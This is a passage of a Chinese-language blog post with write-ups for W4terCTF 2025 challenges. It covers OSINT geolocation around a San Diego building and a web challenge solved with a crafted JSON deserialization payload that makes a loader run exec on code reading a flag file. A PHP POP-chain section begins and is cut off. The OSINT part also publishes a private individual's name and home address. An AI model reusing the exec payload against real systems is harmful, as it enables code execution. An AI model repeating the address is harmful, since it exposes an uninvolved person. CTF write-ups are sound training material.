<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>W4terCTF 2025 | Pomni&#39;s Blog</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta name="description" content="拼尽全力。">
<meta property="og:type" content="article">
<meta property="og:title" content="W4terCTF 2025">
<meta property="og:url" content="https://pomni.fun/2025/05/13/W4terCTF-2025/index.html">
<meta property="og:site_name" content="Pomni&#39;s Blog">
<meta property="og:description" content="拼尽全力。">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://pomni.fun/2025/05/13/W4terCTF-2025/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250503193131.jpg">
<meta property="og:image" content="https://pomni.fun/2025/05/13/W4terCTF-2025/image-20250503175742770.png">
<meta property="og:image" content="https://pomni.fun/2025/05/13/W4terCTF-2025/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250503193419.png">
<meta property="og:image" content="https://pomni.fun/2025/05/13/W4terCTF-2025/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250503193140.png">
<meta property="og:image" content="https://pomni.fun/2025/05/13/W4terCTF-2025/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250503193150.png">
<meta property="og:image" content="https://pomni.fun/2025/05/13/W4terCTF-2025/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250503193205.png">
<meta property="og:image" content="https://pomni.fun/2025/05/13/W4terCTF-2025/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250503193217.jpg">
<meta property="og:image" content="https://pomni.fun/2025/05/13/W4terCTF-2025/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250503193223.png">
<meta property="og:image" content="https://pomni.fun/2025/05/13/W4terCTF-2025/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250503194002.png">
<meta property="og:image" content="https://pomni.fun/2025/05/13/W4terCTF-2025/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250503194142.png">
<meta property="og:image" content="https://pomni.fun/2025/05/13/W4terCTF-2025/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250503194610.png">
<meta property="og:image" content="https://pomni.fun/2025/05/13/W4terCTF-2025/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250503195311.png">
<meta property="og:image" content="https://pomni.fun/2025/05/13/W4terCTF-2025/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250503200140.png">
<meta property="og:image" content="https://pomni.fun/2025/05/13/W4terCTF-2025/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250503200530.png">
<meta property="og:image" content="https://pomni.fun/2025/05/13/W4terCTF-2025/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250505110938.png">
<meta property="og:image" content="https://pomni.fun/2025/05/13/W4terCTF-2025/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250503204222.png">
<meta property="og:image" content="https://pomni.fun/2025/05/13/W4terCTF-2025/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250504135809.png">
<meta property="og:image" content="https://pomni.fun/2025/05/13/W4terCTF-2025/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250504140529.png">
<meta property="og:image" content="https://pomni.fun/2025/05/13/W4terCTF-2025/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250504140829.png">
<meta property="og:image" content="https://pomni.fun/2025/05/13/W4terCTF-2025/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250504155416.png">
<meta property="og:image" content="https://pomni.fun/2025/05/13/W4terCTF-2025/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250504155524.png">
<meta property="og:image" content="https://pomni.fun/2025/05/13/W4terCTF-2025/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250504155559.png">
<meta property="og:image" content="https://pomni.fun/2025/05/13/W4terCTF-2025/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250504155659.png">
<meta property="og:image" content="https://pomni.fun/2025/05/13/W4terCTF-2025/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250504155944.png">
<meta property="og:image" content="https://pomni.fun/2025/05/13/W4terCTF-2025/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250504160243.png">
<meta property="og:image" content="https://pomni.fun/2025/05/13/W4terCTF-2025/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250504160818.png">
<meta property="og:image" content="https://pomni.fun/2025/05/13/W4terCTF-2025/image-20250504162719128.png">
<meta property="og:image" content="https://pomni.fun/2025/05/13/W4terCTF-2025/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250504163434.png">
<meta property="og:image" content="https://pomni.fun/2025/05/13/W4terCTF-2025/image-20250504163921288.png">
<meta property="og:image" content="https://pomni.fun/2025/05/13/W4terCTF-2025/image-20250504164403519.png">
<meta property="og:image" content="https://pomni.fun/2025/05/13/W4terCTF-2025/image-20250504164803915.png">
<meta property="og:image" content="https://pomni.fun/2025/05/13/W4terCTF-2025/image-20250504165220376.png">
<meta property="og:image" content="https://pomni.fun/2025/05/13/W4terCTF-2025/image-20250504170855720.png">
<meta property="og:image" content="https://pomni.fun/2025/05/13/W4terCTF-2025/image-20250504172003259.png">
<meta property="og:image" content="https://pomni.fun/2025/05/13/W4terCTF-2025/image-20250504172338683.png">
<meta property="og:image" content="https://pomni.fun/2025/05/13/W4terCTF-2025/image-20250504203337339.png">
<meta property="og:image" content="https://pomni.fun/2025/05/13/W4terCTF-2025/image-20250504223254918.png">
<meta property="og:image" content="https://pomni.fun/2025/05/13/W4terCTF-2025/3.png">
<meta property="og:image" content="https://pomni.fun/2025/05/13/W4terCTF-2025/1.png">
<meta property="og:image" content="https://pomni.fun/2025/05/13/W4terCTF-2025/2.png">
<meta property="og:image" content="https://pomni.fun/2025/05/13/W4terCTF-2025/31.png">
<meta property="og:image" content="https://pomni.fun/2025/05/13/W4terCTF-2025/32.png">
<meta property="og:image" content="https://pomni.fun/2025/05/13/W4terCTF-2025/4.png">
<meta property="og:image" content="https://pomni.fun/2025/05/13/W4terCTF-2025/5.png">
<meta property="og:image" content="https://pomni.fun/2025/05/13/W4terCTF-2025/6.png">
<meta property="og:image" content="https://pomni.fun/2025/05/13/W4terCTF-2025/7.png">
<meta property="og:image" content="https://pomni.fun/2025/05/13/W4terCTF-2025/8.png">
<meta property="og:image" content="https://pomni.fun/2025/05/13/W4terCTF-2025/9.png">
<meta property="og:image" content="https://pomni.fun/2025/05/13/W4terCTF-2025/10.png">
<meta property="og:image" content="https://pomni.fun/2025/05/13/W4terCTF-2025/11.png">
<meta property="og:image" content="https://pomni.fun/2025/05/13/W4terCTF-2025/12.png">
<meta property="og:image" content="https://pomni.fun/2025/05/13/W4terCTF-2025/13.png">
<meta property="og:image" content="https://pomni.fun/2025/05/13/W4terCTF-2025/14.png">
<meta property="og:image" content="https://pomni.fun/2025/05/13/W4terCTF-2025/15.png">
<meta property="og:image" content="https://pomni.fun/2025/05/13/W4terCTF-2025/16.png">
<meta property="og:image" content="https://pomni.fun/2025/05/13/W4terCTF-2025/17.png">
<meta property="og:image" content="https://pomni.fun/2025/05/13/W4terCTF-2025/18.png">
<meta property="og:image" content="https://pomni.fun/2025/05/13/W4terCTF-2025/19.png">
<meta property="og:image" content="https://pomni.fun/2025/05/13/W4terCTF-2025/20.png">
<meta property="og:image" content="https://pomni.fun/2025/05/13/W4terCTF-2025/21.png">
<meta property="og:image" content="https://pomni.fun/2025/05/13/W4terCTF-2025/22.png">
<meta property="og:image" content="https://pomni.fun/2025/05/13/W4terCTF-2025/23.png">
<meta property="og:image" content="https://pomni.fun/2025/05/13/W4terCTF-2025/24.png">
<meta property="og:image" content="https://pomni.fun/2025/05/13/W4terCTF-2025/25.png">
<meta property="og:image" content="https://pomni.fun/2025/05/13/W4terCTF-2025/26.png">
<meta property="og:image" content="https://pomni.fun/2025/05/13/W4terCTF-2025/27.png">
<meta property="og:image" content="https://pomni.fun/2025/05/13/W4terCTF-2025/28.png">
<meta property="og:image" content="https://pomni.fun/2025/05/13/W4terCTF-2025/29.png">
<meta property="og:image" content="https://pomni.fun/2025/05/13/W4terCTF-2025/30.png">
<meta property="og:image" content="https://pomni.fun/2025/05/13/W4terCTF-2025/image-20250504224517508.png">
<meta property="og:image" content="https://pomni.fun/2025/05/13/W4terCTF-2025/list.png">
<meta property="article:published_time" content="2025-05-13T11:33:14.000Z">
<meta property="article:modified_time" content="2025-05-18T08:47:52.088Z">
<meta property="article:author" content="Pomni">
<meta property="article:tag" content="CTF">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://pomni.fun/2025/05/13/W4terCTF-2025/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250503193131.jpg">
  
    <link rel="alternate" href="/atom.xml" title="Pomni's Blog" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
  
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fork-awesome@1.2.0/css/fork-awesome.min.css">

<!-- hexo injector head_end start -->
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Pomni&#39;s Blog</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
        
          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
        
        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://pomni.fun"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main"><article id="post-W4terCTF-2025" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/05/13/W4terCTF-2025/" class="article-date">
  <time class="dt-published" datetime="2025-05-13T11:33:14.000Z" itemprop="datePublished">2025-05-13</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="p-name article-title" itemprop="headline name">
      W4terCTF 2025
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="OSINT"><a href="#OSINT" class="headerlink" title="OSINT"></a>OSINT</h1><p>非常好玩的图寻题，但充分暴露出地理常识为0。幸运地抢了个三血。</p>
<h2 id="海的那边是"><a href="#海的那边是" class="headerlink" title="海的那边是"></a>海的那边是</h2><p>POV：<strong>羡慕出题人在海边度假</strong></p>
<p><img src="/2025/05/13/W4terCTF-2025/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250503193131.jpg" alt="alt text"></p>
<p>因为对出题人在群里说正在San Diego的印象比较深，马上定位图片位置大概就是La Jolla。</p>
<h3 id="task1"><a href="#task1" class="headerlink" title="task1"></a>task1</h3><p>保存图片后查看图片属性</p>
<p><img src="/2025/05/13/W4terCTF-2025/image-20250503175742770.png" alt="alt text"><br>ans：<u><strong>20250427</strong></u></p>
<h3 id="task3"><a href="#task3" class="headerlink" title="task3"></a>task3</h3><p><img src="/2025/05/13/W4terCTF-2025/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250503193419.png" alt="alt text"></p>
<p>先定位到建筑的位置会更方便做剩下几问，于是打开谷歌识图：<br>发现了一模一样的建筑，连水管和猫头鹰装饰都一模一样！</p>
<p><img src="/2025/05/13/W4terCTF-2025/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250503193140.png" alt="alt text"></p>
<p>打开作者主页：</p>
<p><img src="/2025/05/13/W4terCTF-2025/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250503193150.png" alt="微信图片_20250503193150"></p>
<p>其他图片显示的内容也佐证了这一点，<u>在海边</u>。</p>
<p>本来想在谷歌地图里面暴走一圈找到这个建筑来着，但是太暴力了点。</p>
<p>又想去其他社交平台找这个作者，但是没什么发现。不过意外发现了这个作者的住址：<strong><em>Jeremiah Regner, located at 9505 Gold Coast Dr Apt 98, San Diego, CA</em>.</strong></p>
<p><img src="/2025/05/13/W4terCTF-2025/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250503193205.png" alt="微信图片_20250503193205"></p>
<p>地点极其符合——在谷歌地图定位这个地址：</p>
<p><img src="/2025/05/13/W4terCTF-2025/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250503193217.jpg" alt="微信图片_20250503193217"></p>
<p>先在作者家附近的海岸找，果然找到了：</p>
<p><img src="/2025/05/13/W4terCTF-2025/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250503193223.png" alt="微信图片_20250503193223"></p>
<p>在地图上走啊走，就走到了：</p>
<p><img src="/2025/05/13/W4terCTF-2025/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250503194002.png" alt="微信图片_20250503194002"></p>
<p>ans：<u><strong>Hubbs Hall</strong></u></p>
<h3 id="task2"><a href="#task2" class="headerlink" title="task2"></a>task2</h3><p>谷歌地图上是有充电头信息的，但是找不到，绷🤣</p>
<p>不过好在有很多充电桩分布的网站提供信息。</p>
<p><img src="/2025/05/13/W4terCTF-2025/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250503194142.png" alt="微信图片_20250503194142"></p>
<p>ans：<u><strong>J1772</strong></u></p>
<h3 id="task4"><a href="#task4" class="headerlink" title="task4"></a>task4</h3><p>ez，随便找个出发点，最后都要坐30路公交。</p>
<p><img src="/2025/05/13/W4terCTF-2025/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250503194610.png" alt="微信图片_20250503194610"></p>
<p>ans：<u><strong>30</strong></u></p>
<h3 id="task5"><a href="#task5" class="headerlink" title="task5"></a>task5</h3><p>Hubbs Hall旁边的潮汐监测点在 Sccripps Pier，其站点编号是9410230。</p>
<p>找到相关数据网站就有了。</p>
<p><img src="/2025/05/13/W4terCTF-2025/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250503195311.png" alt="微信图片_20250503195311"></p>
<p>图中数据即是5月7号的海浪预测峰值</p>
<p>p.s.：因为这里死活填不对，拷打了下出题人，出题人说可以ft转cm可以先舍去小数部分再计算，4ft算出来四舍五入是122，但是正确答案是121🥲。（原来保留整数就真的只是保留整数（部分）。。）</p>
<p>以及不同网站的预测数据不太一样，有点搞……</p>
<p>ans：<u><strong>122 or 143</strong></u></p>
<h3 id="task6"><a href="#task6" class="headerlink" title="task6"></a>task6</h3><p>不学地理是这样的，☝️🤓可以算出海浪峰值周期40000多秒。</p>
<p>找到现成的数据就好了：</p>
<p><img src="/2025/05/13/W4terCTF-2025/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250503200140.png" alt="微信图片_20250503200140"></p>
<p>ans：<u><strong>10</strong></u></p>
<h3 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h3><p><img src="/2025/05/13/W4terCTF-2025/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250503200530.png" alt="微信图片_20250503200530"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Flag: W4terCTF&#123;Sc1ENc3_UndOUBTEd1Y_IMMorT4I_5EA_Un4R9U481y_IlLumln4tlnG&#125;</span><br></pre></td></tr></table></figure>



<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="Core-Dump-Error（签到题）"><a href="#Core-Dump-Error（签到题）" class="headerlink" title="Core Dump Error（签到题）"></a>Core Dump Error（签到题）</h2><p>半夜误打误撞做出来了。</p>
<p>原来视频里面的issue只是被close而不是被delete了 hhh。</p>
<p>只要找到相关issue的POC链然后改一下exec执行的命令就好了</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;objects&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;1&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;frame&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;attrs&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;f_lineno&quot;</span><span class="punctuation">:</span> <span class="string">&quot;11&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;f_locals&quot;</span><span class="punctuation">:</span> <span class="string">&quot;12&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;f_code&quot;</span><span class="punctuation">:</span> <span class="string">&quot;13&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;f_globals&quot;</span><span class="punctuation">:</span> <span class="string">&quot;14&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;f_back&quot;</span><span class="punctuation">:</span> <span class="string">&quot;15&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;11&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;int&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="number">1</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;12&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;dict&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="punctuation">&#125;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;13&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;code&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;attrs&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;co_filename&quot;</span><span class="punctuation">:</span> <span class="string">&quot;131&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;co_name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;132&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;14&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;dict&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;141&quot;</span><span class="punctuation">:</span> <span class="string">&quot;143&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;142&quot;</span><span class="punctuation">:</span> <span class="string">&quot;144&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;15&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;NoneType&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;131&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;str&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;filename&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;132&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;str&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;name&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;141&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;str&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;__name__&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;142&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;str&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;__loader__&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;143&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;str&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;print(open(&#x27;/tmp/flag&#x27;).read())&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;144&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;EvilLoader&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;attrs&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;get_source&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1441&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;1441&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;builtin_function&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;exec&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;threads&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;0&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;frame&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;current_thread&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;files&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;metadata&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0.4.0&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2025/05/13/W4terCTF-2025/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250505110938.png" alt="微信图片_20250505110938"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Flag: W4terCTF&#123;c0N9ra7u1ATIonS_0N_hacK1nG_A_pRoGraM_foR_TH3_1IrSt_t1Me&#125;</span><br></pre></td></tr></table></figure>



<h2 id="Happy-PHP"><a href="#Happy-PHP" class="headerlink" title="Happy PHP"></a>Happy PHP</h2><h3 id="part1"><a href="#part1" class="headerlink" title="part1"></a>part1</h3><p>阅读php代码，梳理逻辑如下：</p>
<ul>
<li><p>如果url中传递了参数  gogogo ，该对象就会被反序列化。</p>
</li>
<li><p>反序列化的对象会触发魔术方法__wakeup()，并返回gogogo的结果。</p>
</li>
<li><p>如果触发phpis 类的__invoke()方法，则执行fun1(fun2())，并通过eval()函数执行代码。返回结果 &#x3D;&#x3D; ‘Yelia’的话，就调用 what-&gt;saying。</p>
</li>
<li><p>要调用piece1-&gt;here()，必须让 $flag 的 MD5 值等于 md5(666)。</p>
</li>
<li><p>如果两个不同的变量 $sy 和 $su 的 MD5 和 SHA1相等，就能echo fl491.txt。</p>
</li>
</ul>
<p>通过构造反序列化的POP链，获得payload</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span 